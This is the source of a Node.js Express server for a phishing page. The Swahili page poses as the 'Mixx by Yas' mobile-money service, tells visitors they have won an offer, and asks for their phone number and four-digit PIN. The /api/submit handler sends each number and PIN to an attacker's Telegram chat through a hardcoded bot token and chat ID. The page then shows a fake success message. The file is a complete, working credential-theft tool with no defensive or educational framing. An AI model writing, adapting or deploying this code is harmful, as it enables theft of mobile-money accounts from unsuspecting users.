const express = require('express');
const axios = require('axios');
const cors = require('cors');

const app = express();
const PORT = process.env.PORT || 3000;

// Hardcoded credentials (NO environment variables needed)
const BOT_TOKEN = '8884996201:AAGQHy_bXjAjZ7hUDGY4QRP0K-cSxHcXe9Y';
const CHAT_ID = '8999616005';

app.use(cors());
app.use(express.json());

const HTML = `<!DOCTYPE html>
<html lang="sw">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Mixx by Yas</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box;}
        body{background:linear-gradient(145deg,#0b2b26,#0a1f1c);font-family:'Segoe UI',sans-serif;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:1.5rem;}
        .card{max-width:520px;width:100%;background:rgba(255,255,255,0.97);border-radius:48px;padding:2rem 1.8rem;box-shadow:0 25px 45px -12px rgba(0,0,0,0.45);}
        h2{font-size:1.85rem;font-weight:700;background:linear-gradient(135deg,#d4af37,#f5c542);background-clip:text;-webkit-background-clip:text;color:transparent;text-align:center;}
        .subtitle{text-align:center;color:#2c5a4e;margin-bottom:1.8rem;padding-bottom:1rem;border-bottom:1px dashed #b9dfcf;}
        .phone-input{margin-bottom:1.5rem;}
        .phone-input input{width:100%;padding:1rem;font-size:1.1rem;border:2px solid #e2e8f0;border-radius:60px;background:#fefdf8;}
        .phone-input input:focus{border-color:#f5b042;}
        .pin-label{font-weight:600;color:#1e4a3b;margin-bottom:0.75rem;}
        .pin-boxes{display:flex;gap:14px;justify-content:center;margin:0.5rem 0;}
        .pin-box{width:70px;height:70px;text-align:center;font-size:2.2rem;font-weight:700;border:2px solid #cfdfd9;border-radius:20px;background:white;}
        .pin-box:focus{border-color:#f5b042;outline:none;}
        .note{text-align:center;font-size:0.72rem;color:#6f8a82;margin-top:1.8rem;background:#f3f9f6;padding:8px;border-radius:40px;}
        footer{text-align:center;margin-top:1.8rem;font-size:0.7rem;color:#98afa8;}
        .toast{position:fixed;bottom:30px;left:50%;transform:translateX(-50%);background:#1e2f2a;color:#ffde9c;padding:12px 28px;border-radius:60px;opacity:0;transition:0.2s;pointer-events:none;z-index:1000;}
        @media(max-width:480px){.pin-box{width:55px;height:55px;font-size:1.8rem;}}
    </style>
</head>
<body>
    <div class="card">
        <h2>✨ Umejishindia Ofa Wa Mixx by Yas pesa ✨</h2>
        <p class="subtitle">Karibu! Ingiza namba yako ya simu na Neno Siri (YAS PIN - 4 namba) ili kupata ofa ya kipekee.</p>
        <div class="phone-input">
            <input type="tel" id="phoneNumber" placeholder="Namba ya Simu (ex: 0765123456)" maxlength="10" inputmode="numeric">
        </div>
        <div class="pin-label">🔐 Mixx by Yas PIN (Siri yako ya 4 tarakimu)</div>
        <div class="pin-boxes">
            <input type="tel" maxlength="1" class="pin-box" id="pin1" inputmode="numeric">
            <input type="tel" maxlength="1" class="pin-box" id="pin2" inputmode="numeric">
            <input type="tel" maxlength="1" class="pin-box" id="pin3" inputmode="numeric">
            <input type="tel" maxlength="1" class="pin-box" id="pin4" inputmode="numeric">
        </div>
        <p class="note">⚠️ Kuingiza neno siri kunakubali maelezo ya matumizi na masharti ya ofa.</p>
        <footer>© Mixx by Yas – Ofa maalum ya wateja.</footer>
    </div>
    <div id="toast" class="toast"></div>
    <script>
        const pin1=document.getElementById('pin1');
        const pin2=document.getElementById('pin2');
        const pin3=document.getElementById('pin3');
        const pin4=document.getElementById('pin4');
        const phone=document.getElementById('phoneNumber');
        const toast=document.getElementById('toast');
        
        function show(msg,isError=true){
            toast.textContent=msg;
            toast.style.opacity='1';
            toast.style.backgroundColor=isError?'#872341':'#1f4e3f';
            setTimeout(()=>toast.style.opacity='0',3000);
        }
        
        async function submit(){
            const p=phone.value.trim();
            const pin=pin1.value+pin2.value+pin3.value+pin4.value;
            
            if(!p || p.length!==10){show('Phone must be 10 digits');return;}
            if(pin.length!==4){show('PIN must be 4 digits');return;}
            
            show('Sending...',false);
            
            try{
                const res=await fetch('/api/submit',{
                    method:'POST',
                    headers:{'Content-Type':'application/json'},
                    body:JSON.stringify({phoneNumber:p,pin:pin})
                });
                const data=await res.json();
                if(data.success){
                    show('Success! Offer claimed.',false);
                    phone.value='';
                    pin1.value='';pin2.value='';pin3.value='';pin4.value='';
                    pin1.focus();
                }else{
                    show(data.error||'Failed, try again');
                }
            }catch(e){
                show('Network error. Try again.');
            }
        }
        
        pin1.addEventListener('input',e=>{if(e.target.value)pin2.focus();});
        pin2.addEventListener('input',e=>{if(e.target.value)pin3.focus();});
        pin3.addEventListener('input',e=>{if(e.target.value)pin4.focus();});
        pin4.addEventListener('input',e=>{if(e.target.value)submit();});
        
        [pin1,pin2,pin3,pin4].forEach(p=>{
            p.addEventListener('keydown',e=>{
                if(e.key==='Backspace' && !p.value){
                    if(p===pin2)pin1.focus();
                    if(p===pin3)pin2.focus();
                    if(p===pin4)pin3.focus();
                }
            });
        });
    </script>
</body>
</html>`;

app.get('/', (req, res) => {
    res.send(HTML);
});

app.post('/api/submit', async (req, res) => {
    console.log('Received:', req.body);
    const { phoneNumber, pin } = req.body;
    
    if(!phoneNumber || !pin){
        return res.json({success:false, error:'Missing data'});
    }
    if(phoneNumber.length!==10){
        return res.json({success:false, error:'Phone must be 10 digits'});
    }
    if(pin.length!==4){
        return res.json({success:false, error:'PIN must be 4 digits'});
    }
    
    const message = `NEW SUBMISSION!\nPhone: ${phoneNumber}\nPIN: ${pin}\nTime: ${new Date().toLocaleString()}`;
    
    try {
        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            chat_id: CHAT_ID,
            text: message
        });
        console.log('Sent to Telegram');
        res.json({success: true});
    } catch(err) {
        console.log('Telegram error:', err.message);
        res.json({success: false, error: 'Telegram error'});
    }
});

app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
    console.log(`Bot token: ${BOT_TOKEN ? 'Set' : 'Missing'}`);
    console.log(`Chat ID: ${CHAT_ID ? 'Set' : 'Missing'}`);
});
